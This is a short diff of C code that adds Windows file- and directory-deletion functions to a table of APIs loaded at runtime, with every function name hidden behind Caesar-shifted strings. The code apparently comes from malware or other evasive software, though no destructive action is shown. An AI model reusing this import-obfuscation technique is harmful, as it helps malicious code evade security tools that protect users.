@@ -31,11 +31,14 @@ void InitApis() {
 	Api.MultiByteToWideChar = (TMultiByteToWideChar)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("RzqynG~yjYt\\nijHmfw"));
 	Api.FindFirstFileW = (TFindFirstFileW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("KnsiKnwxyKnqj\\"));
 	Api.FindNextFileW = (TFindNextFileW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("KnsiSj}yKnqj\\"));
+	Api.RemoveDirectoryW = (TRemoveDirectoryW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("Wjrt{jInwjhytw~\\"));
+	Api.DeleteFileW = (TDeleteFileW)Api.GetProcAddress(hKernel32, CAESAR_DECRYPT("IjqjyjKnqj\\"));
 
 	hMsvcrt = LoadLibraryA(CAESAR_DECRYPT("rx{hwy3iqq"));
 	if (!hMsvcrt) {
 		return;
 	}
+
 	Api.strcpy = (Tstrcpy)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("xywhu~"));
 	Api.malloc = (Tmalloc)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("rfqqth"));
 	Api.free = (Tfree)Api.GetProcAddress(hMsvcrt, CAESAR_DECRYPT("kwjj"));
